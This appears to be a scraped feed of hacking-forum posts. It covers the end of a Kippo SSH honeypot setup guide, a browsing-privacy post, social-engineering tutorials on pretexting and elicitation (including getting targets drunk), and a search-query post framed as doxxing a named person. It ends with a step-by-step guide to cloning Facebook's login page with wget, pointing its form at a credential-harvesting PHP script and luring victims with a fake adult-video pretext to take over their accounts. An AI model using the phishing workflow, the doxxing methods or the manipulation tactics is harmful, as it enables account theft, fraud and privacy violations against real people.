<p>Before you configure kippo, let’s configure your ssh port</p>
<pre><code class="lang-auto">sed -e 's/^Port.*/Port 443/' /etc/ssh/sshd_config
service ssh restart
</code></pre>
<p><em>Here I use the port 443 to connect to my ssh server so I can access to my server behind a firewall</em></p>
<h3>Configure kippo</h3>
<p>the file kippo.cfg.dist contains the basic configuration of the honeypot</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/bfeab0b398ba5756f303534e7448479387d53290.png" width="415" height="500"></p>
<p>Here you can change the name of your server and more option.</p>
<p>Here the fake ssh server run on port 2222</p>
<p>add an iptables rule to redirect 22 to 2222</p>
<pre><code class="lang-bash">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j REDIRECT --to-port 2222
</code></pre>
<h3>Create Fake file system</h3>
<p>Create a fake filesystem with createfs.py and put the file fs.pickle in your kippo directory</p>
<pre><code class="lang-bash">./createfs.py &gt; fs.pickle
</code></pre>
<p>You can start your honey pot ./start.sh</p>
<h2>More Thing to do !</h2>

          <title>Achieving Anonymity: Securing Your Browsing Habits</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>to stay secure, you dont just need Tor, and a VPN. You need good browsing habits.</p>
<p>**</p>
<h2>What are Browsing Habits?</h2>
<p>**<br>
Let me tell explain. Its basically how you behave on the internet, what websites you click, your language pattern (how you speak), what websites you are registered to, pretty much anything that is used to identifying you, and how you behave towards those things. And thats where cookies come in and what not.</p>
<p>**</p>
<h2>How Do I Ensure My Browsing Habits Are Secure?</h2>
<p>**<br>
Practice. And theres no other way to put it, other than you need to practice.</p>
<p><strong>Staying Away from Malware:</strong><br>
Believe it or not, this is apart of browsing habits, you need to know how to stay away from malware, especially if you want to have good browsing habits.<br>
This includes</p>
<pre><code>1. Dont click on suspicious links
2. dont download unrecognizable software
3. stay away from potential danger websites
4. installing a good anti virus software
5. keeping your firewall up to date along with your AV
6. dont accept files from unknown sources or people you dont know.
7. and so on and so on
</code></pre>
<p><em>Just the basic steps that any average PC user knows how to. There are of course advanced precautions if you ask me, that I personally use. for example, if you are very paranoid you can take any of these to use.</em></p>
<pre><code>1. make sure 'S' is included in the URL. (HTTPS)


1. Dont type in your password on unencrypted websites, as it will be left in clear text for any curious hacker to see.


1. Use a different password for all your accounts.


1. Use a different email for all your accounts


1. Use different language patterns


1. Make sure people doesnt get an idea of your timezone.
</code></pre>
<p>All of these are very advanced in my opinion, and are very good to use if you are a hacker that has potential enemies, i.e (black hat) or just dont want all your data on the internet. I can name many more, but I dont think you will need more.</p>
<p>**</p>
<h2>Installing Extensions:</h2>
<p>**<br>
You need to install extensions to your browser, which is a MUST. Of course depending on your level of paranoia. Me personally, I am at the very top level of paranoia, and therefore use a bunch of extensions, that keep as much of my data secret as possible.<br>
To use these extensions you need to also get familiar with them, and understand what they do, and why they do it. I will list a few below.</p>
<p>**</p>
<ul>
<li>
<p>Web of Trust: It provides a small circle next to the website before you click it with one of 3 colours. green; being a reliable source. orange, being reliable in some way or another. and red; being visit at your own risk. Of course, it doesnt mean you cant visit the website just because the circle is orange or red, but it just tells you that Web of Trust has deteced some sort of virus that could link to you in one way or another by visiting that website.</p>
</li>
<li>
<p>uBlock: It is exactly what you think it is, it block ads, and we all know it from our old friend AdBlock and AdBlock Plus. Think of uBlock as their older brother, because thats what he is.</p>
</li>
<li>
<p>Next up is Privacy Badger, one of my favorites. Badger tells you how many trackers and cookies are on a website, and shows you the potential danger of those trackers and cookies again in 3 differnet colours, green orange and red. You can choose to block the cookie by dragging the present color to the left (red) and the cookie wont be able to track you.</p>
</li>
<li>
<p>The last extension I will introduce to you is HTTPS Everywhere. It is just what it appear to be. It provides HTTPS encryption on all sites that is available to HTTPS. This means that you are safe from Man in the Middle Attacks, and SSlStripiing.</p>
</li>
</ul>
<h2>Conclusion:</h2>
<p>So browsing habits are ways companies and websites try and identify you online, and by installing extensions and dont use the same pattern in general, you thereby achieve this ability to not get identified by websites.</p>

          <title>Social Engineering - Part 3 - Pretexting</title>
          <dc:creator><![CDATA[n3xUs]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p><span class="hashtag">#SOCIAL</span> ENGINEERING - PART 3 - PRETEXTING#</p>
<p><strong>What is Pretexting?</strong></p>
<p>Pretexting is defined as the act of presenting oneself as someone else in order to obtain private/confidential information. It can go from a simple lie to impersonate someone to even creating a whole new identity and using that identity to obtain said private information. Depending on the situation, pretexting can be as simple as playing out a role or acting a part, where in others it could mean that you will be living that persona for a while…</p>
<p>The main goal of pretexting is to create a scenario or a situation where your target is comfortable with releasing confidential infomartion.</p>
<p>It is in pretexting that a great amount of the information you gathered will come in handy, as the quality and credibility of your pretext is closely related to the information you gathered (for example, if your backstory or your identity has some holes, your target will probably notice something is wrong and get suspicious).</p>
<p>Like Part 1 of this series (Information Gathering) no piece of information is irrelevant. The more information the better.</p>
<p>Many social engineers create social media and email accounts to add credibility to their persona.</p>
<p>As you carry on SE Attacks, you’ll create/develop various pretexts. It is not something you create just one time hoping it will work on every other attack you plan.</p>
<hr>
<p><strong>Planning the Pretext</strong></p>
<p>Like every other skill we’ve discussed on previous posts, there are certain steps that help us plan out our attacks. Pretexting is no exception. Below is a small list of certain points I think are worth mentioning:</p>
<ul>
<li>
<p>As previously mentioned, by <strong>gathering more information</strong> the chance of success will be higher.</p>
</li>
<li>
<p><strong>Involve your personal interests</strong> - Like I mentioned in my last post, nothing can kill a conversation faster if you look uncomfortable and with little confidence while in a conversation. This step helps you with that. By including your own personal interests and things that you know a lot about in your pretext (basically topics that you are comfortable talking about), you have the opportunity to talk about a lot of stuff and at the same time it gives the so-needed confidence. This also helps to avoid those awkard silenece’s that nobody likes.</p>
</li>
<li>
<p><strong>Practice your accents and expressions</strong> - For example, if you’re impersonating someone that was born and raised in Scotland, you should try to speak with a scottish accent and be familiar with common scottish terms and expressions. This all helps you give credibility to your persona and to avoid suspicion.</p>
</li>
<li>
<p><strong>Keep it simple</strong> - Of course having a meticulous and detailed approach is not only important, but necessary. However, having too many details to worry about can be complicated. Keep details important, but small. Don’t go for an extremely elaborate pretext.</p>
</li>
<li>
<p><strong>Try to look spontaneous</strong> - Again, planning ahead is necessary, but try not to create a script and follow it by the letter, otherwise you’ll look like a robot while talking to other people and you’ll scare them off. Try to go for something that looks more natural.</p>
</li>
<li>
<p><strong>Acessorize</strong> - i.e, if you are impersonating a tech support guy try to bring items  or tool that an actual tech support would have, like a briefcase, nametag, clipboard etc… (Honestly, I don’t know what tools and other gear a tech support guy has, but you get the idea).</p>
</li>
</ul>
<hr>
<p>That’s it for this post. Hope you enjoyed reading and again, if you’d like to add something to what I said or have any suggestions, feel free to comment below.</p>
<p>This might be the last post in this series since what I have left to talk about is pretty much the actual human psychology and how the mind works and reacts - topics that are really hard (and long) to write about, but who knows, maybe sometime in the future… But for now, that’s all I have for you!</p>

          <title>Gathering Sensitive Information: Advanced Search Queries</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>**</p>
<h2>What Is Search Queries Again?</h2>
<p>**</p>
<p>When you type something into Google, or whatever you are using, you for obvious reasons don’t get all the results on your search, because that would simply be way too much data for your computer to handle.<br>
<em>hence: that is why Google have so many and such big servers</em> - not fit for your laptop or desktop.</p>
<p><strong>Definition:</strong><br>
A web search query is a query that a user enters into a web search engine to satisfy his or her information needs. - According to Wiki at least.</p>
<p>That would be the ideal definition you’d get by asking a non-hacker. However, now lets imagine you asked Merozey, and see what you would get.</p>
<p><strong>Definition:</strong><br>
By performing a search query in a database holding useful information, your query will go through the most popular databases potentially holding your answer, and will display that information accordingly, depending on its popularity.</p>
<p>**</p>
<h2>Basics of Advanced Search Queries:</h2>
<p>**<br>
So, let me introduce to you a search query I use quite often actually, because it is very convenient, and provides good results. What I am introducing to you, is your new friend called A. He looks like this</p>
<p><strong>@</strong></p>
<p>This little fella can pull some good information in a short and sweet search query looking something like this:</p>
<p><strong><span class="mention">@MichaelOregon</span></strong></p>
<p>Remember our friend Michael that we are trying to DoX?<br>
What is the <strong>@</strong> doing exactly?</p>
<p>It narrows down your results tremendously, because as I mentioned above, your search query goes through hundreds of databases, and if you don’t put in @, you will receive everything that have either <em>Michael</em> or <em>Oregon</em> in it. therefore it is very effective to put in @, because it will look for specifically those 2 names <strong>TOGETHER</strong>. You will of course still get useless information, but that wont be whats being displayed to you at the top of your page. Usually (if done correctly) you should see potential social media profiles, and websites etc. first, and then useless information. Trust me, it will save you a lot of time.</p>
<p>**</p>
<h2>Advanced Search Queries:</h2>
<p>**</p>
<p>Now, lets move on to the big boy stuff. This is guaranteed that no average PC user is aware of this, because why would they? My other friend he is also very good at pulling some information when I am looking for specifically a certain thing.</p>
<p><strong>" "</strong></p>
<p>This guy right here can show you for example a spécific location. Lets say you are looking for Michael and you have heard rumours he might be living in USA but even more, he might be living near Pennsylvania. So one thing you could do is this:</p>
<p><strong><span class="mention">@MichaelOregon</span> "Pennsylvania"</strong></p>
<p>This will display (hopefully) a Michael Oregon living in Pennsylvania with potential addresses.</p>
<p>I will possibly make a <span class="hashtag">#2</span> on Advanced Search Queries</p>

          <title>Social Engineering - Part 2 - Elicitation</title>
          <dc:creator><![CDATA[n3xUs]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p><span class="hashtag">#SOCIAL</span> ENGINEERING - PART 2 - ELICITATION#</p>
<p><strong>Elicitation</strong> is a conversation where you subtely try to extract information. However, this conversation needs to look casual and innocent. It’s all about asking the right questions. The goal here is to manipulate the behaviour of your target in order to achieve your goals, which, in this case, is to gather information without compromising yourself. In this step, it is really important how you present yourself to the target and how he perceives/thinks of you (for example, would open up more to someone who looks friendly, confident and that overall seems like a nice person, or to someone that has a shady and sketchy look?). Elicitation offers a low-risk opportunity at information gathering because is something that it’s likely to occur naturally, it’s difficult to detect and it seems non-threatening (like a simple conversation between to stangers at the bar) and also because most people tend to be polite to strangers as they want to be perceived as good and rational people (Useful Note: if your target likes to brag about his achievments, it’s a great opportunnity to gather even more information).</p>
<p><strong>3 Important steps to nail a conversation:</strong></p>
<ul>
<li>
<p><strong>Be natural.</strong> I’m referring to posture, how you act and how others perceive you. If you look too uncomfortable while talking to your target, you’ll likely ruin your attempt at elicitation.</p>
</li>
<li>
<p><strong>Educate yourself</strong>. This is a very important step. You can’t engage in a conversation with your target(s) if you don’t have enough knowledge of what you’re going to talk about (i.e, you shouldn’t go to an “World Economics” convetion if you don’t know anything about world economics. Otherwise you will make a fool of yourself). What i’m saying is you must do some previous research on the topics you’re going to talk about in order to seem natural and avoid suspicion. So, do your research and be prepared. Also, it’s really important that you don’t reach for subjects way out of your league, which leads to the next step.</p>
</li>
<li>
<p><strong>Don’t be greedy.</strong> The whole point of elicitation is to gather information, however you must not be so objective about it, otherwise, peole will get suspicious and will end the conversation (also, if you feel that the conversation is dying out, don’t force it so that you can obtain more information, just stop there, say your goodbyes and part ways). When in a conversation, try to give something back, make the target feel reciprocation (try to make him feel that he is obliged to give you something back). It will make it much easier to obtain information since the target may feel an obligation to share information.</p>
</li>
</ul>
<hr>
<p><span class="hashtag">#METHODS</span> AND SKILLS#</p>
<p><strong>PRELOADING</strong></p>
<p>To the outside world, preloading is viewed almost as a myth. It has been featured numerous times in movies and you probably asked yourself “Can you really do that? Can you manipulate the human mind that way?”. Well, short answer, yes! If you have seen the movie “Inception” (if you haven’t, what are you waiting for?) you’ll know that the main goal of the characters is to plant a seed or an idea into someone else’s mind, making the target think that that idea was originated by himself, without anyone’s or anything’s influece. This is Preloading.</p>
<p>Let me give you a simple example: Let’s say you want to go to an art gallery, but your partner doesn’t show much interest. So one of your first steps is to start dropping very subtle hints, stimulate his/her senses, so you say something like “Did you hear about the new art gallery that just oppened? They say it’s really beatiful and that the artist really knows how to play with colors and you can almost smell the fresh paint. Also, they say that the artist will do a live painting. Who knows? Might be interesting”.</p>
<p>It’s not important if this triggers an immediate response from your partner or not, what’s important is that you planted that so called “seed” in his/her mind, making him/her feel and imagine how the gallery looks like. Now let’s imagine that you’ve got a flyer or a newspaper advertising the gallery, you could leave that in a subtle place where you know your partner is going to see it.</p>
<p>Now if your partners asks something like “What are we doing in the weekend?” or “Got any plans for the weekend?”, using the previous delivered information, you could reply something like “Yeah, I’ve been thinking about that. Maybe it’ll be good for us to leave the house for a while… How about that new art gallery that oppened recently? I mean. we could use a change…”.</p>
<p>With some skill and some luck, maybe you’ll be heading to that art gallery afterall, whereas if you’d taken a more frontal approach, his/her answer might have been an “No! You know I don’t like going to those places…”. Our goal here was to make our partner more inclined to accept our offer.<br>
(Side note: In almost every movie about the main characters pulling off a big heist or conning someone, there’s is preloading involved, i.e Ocean’s Eleven; FOCUS; etc…)</p>
<p><strong>Appealing to your target’s Ego</strong></p>
<p>This is a very simple, crude method, but also very effective. But beware, try not to exaggerate here as your target may think you’re some kind of stalker and get suspicious… To avoid this, try to seem natural and sincere. Try to subtly flatter your target so you can manipulate him into starting a conversation that maybe could not have existed. Also, this is a good ice-breaker if you don’t know how to approach your target.</p>
<p><strong>Expressing a Mutual Interest</strong></p>
<p>This is a very good method since it allows us to create a deeper connection to the target and almost guarantes additional contact with the target.</p>
<p><strong>Deliberately providing false information</strong></p>
<p>Initially, this may seem a very dangerous concept, but if used properly, it’s a very effective attack. Humans have a tendecy to correct any misinformation, it’s in our nature, so if you approach your target saying something like "It’s a know fact that [rival company of the target] is way more technologically advanced than [target’s company] where the target might correct you and respond “Actually, you couldn’t be more wrong, we are way ahead of [given company] and were almost launching a new technology that will blow away the competition”. If used correctly this conversation may lead the target to reveal some real facts, thus providing you with more information.</p>
<p><strong>Offering information</strong></p>
<p>What you’re trying to achieve with this method is to make your target feel obligated do share information with you (As previously discussed). While in a conversation, offering information makes people reply with similar information, so you could use this to lead you target to a certain topic you wish to find out more about…</p>
<p>And last, but not least…</p>
<p><strong>Using alcohol</strong></p>
<p>The oldest trick in the book, this method speaks for itself. Nothing like getting your target drunk or close enough to make him spill out some confidential information…</p>
<hr>
<p><span class="hashtag">#Know</span> your questions…#</p>
<p>There are 4 types of questions: Open-Ended, Closed-Ended, Leading Questions and Assumptive Questions</p>
<p><strong>Open-Ended questions</strong>: These are questions that cannot be answered by a simple affirmative or negative term (“Yes”; “No”; “Yeah”…). These are great for when you are trying to make your target reveal details about a certain topic. Most of the times, people aren’t very fond of these questions, so a planned approach might be necessary.</p>
<p><strong>Closed-Ended questions:</strong> These questions are the opposite of open-ended (Duh…) but the goal here is to lead the target to where you want, rather than obtaining information.</p>
<p><strong>Leading Questions:</strong> These type tries to combine both closed and open-ended questions. These are open-ended questions that have some sort of subtle hint to the answer, allowing the target to give his opinion, but not deviating from the subject too much.</p>
<p><strong>Assumptive Questions:</strong> These are maily used when you want to know if your target has the information you’re looking for. This should only be used when you have some knowledge of the subject you’re asking about. Here you must not accuse the target of anything or arouse any suspicion, otherwise you might end up losing the opportunity.</p>
<hr>
<p><span class="hashtag">#Conclusion</span>#</p>
<p>Elicititaion is a very powerful skill to have, but one that requires much practice to master. When applying these concepts, they need to be evenly balanced. Think of it as an inverted pyramid, start by asking more neutral questions and then move on to more specific, narrow ones.</p>

            <p>SET is great when you have a short space of time at hand, however sometimes you want to know whats actually going on under the hood or have found a site you can’t clone with SET.</p>
<h3>Step 1: Select Your Target!</h3>
<p>The First Thing You’re Going to Want to Do Is Select the Site Login You Wish to Clone! For This Tutorial I Will Be Using Facebook, However This Can Be Whatever You Like. Some Sites Use Some Javascript Obfuscation Magic to Hide the <code>Input</code> Elements (Like the <a href="http://login.live.com">login.live.com</a> Page). But Most Major Sites Use the Traditional <code>Input</code> Element Method.<br>
##<span class="hashtag">#Step</span> 2: Use Wget to Download the Login Page</p>
<p>Now You Have Your Site in Mind, You Will Need to Download the Login Page. This Can Be Done with Wget.</p>
<p>wget -U “Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0” <a href="https://www.facebook.com/">https://www.facebook.com/</a> -O facebook.html</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/8786bf3f4b111dac02b0548a540908baeb1f0873.jpg" alt="" width="" height=""></p>
<p>Wget is the command used to download files.</p>
<p>-U means custom useragent, if we leave this out many sites will redirect us to other custom sites as Wget isn’t a browser!</p>
<p>-O means we save the file with a custom name.</p>
<h3>Step 3: Modify the Exisiting Page Source.</h3>
<p>This is where you will get your hands dirty, can be a little confusing at times, however is probably one of the most important steps. You will need to locate the form located on the page. My main editor is vim/atom, but I will be using atom for this tutorial. Open the facebook.html or file you downloaded with your editor and locate the form tag with a search.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/6d0f8e054d445e813e3227344b5cce4a599dfa57.jpg" alt="" width="" height=""></p>
<p>With a simple search I was able to locate the form, you will need to modify this to post to a custom PHP script. Our PHP script is called post.php, and is located in the same directory as our login html. So change the  tag to say.  and delete the rest of the items in the  between the first and second square angled brackets &lt;&gt;.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/ff27427474026106a582de723b979dc3c417fab8.jpg" alt="" width="" height=""></p>
<p>##<span class="hashtag">#Step</span> 4: Write/Download a Credential Harvester.</p>
<p>So now, when you go to the page, click login, it will attempt to post the details entered to your post.php script… Which doesn’t exist yet. You need to either write one or download one. I stole the one from SET and it works great. I have modifed it a little too. You can get this script from this fancy looking link or steal it from SET somewhere.</p>
<h3>Step 5: Do Some Server Magic!</h3>
<p>Hopefully, you have a server with PHP and the like installed. Kali itself comes with Apache pre-installed and the directory is at /var/www/.</p>
<p>If you’re like me, you use a hosted VPS. If you want one, you can upload a Kali ISO to it to make social engineering engagements more convincing and easier. I personally use a VPS hosting provider called Vultr, and you can get $5 free credit if you use <a href="http://www.vultr.com/?ref=6843429">this link</a>, which is easily enough for a quick engagement. You can also register a free-domain at <a href="http://freenom.com">freenom.com</a>. This is great if you don’t exactly want to spend a lot of money but just want to try it all out.</p>
<p>Anyway… Once you’ve uploaded the files to a server, you may find you can enter your details to the page, and be re-directed, but no harvest files are created. To fix this, use chown to change the permissions of the folder.</p>
<p>chown -R www-data:www-data /var/www</p>
<p>This fixes most problems for me!</p>
<h3>Step 6: Social Engineer!</h3>
<p>Now you will need to “get creative!”. Send the target an email or a message with something compelling on the other side that requires them to login. My common pretext is telling somebody about an extremely funny video that is 18+ rated, and they will need to re-login in order to watch it, I then edited the post.php to redirect to a funny video. By the time they’ve finished laughing, you are already in their account.</p>
<p>Hopefully this is of help to you people! I learnt how do this by playing with it, and looking at what SET did, and it helped me to understand it all better <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
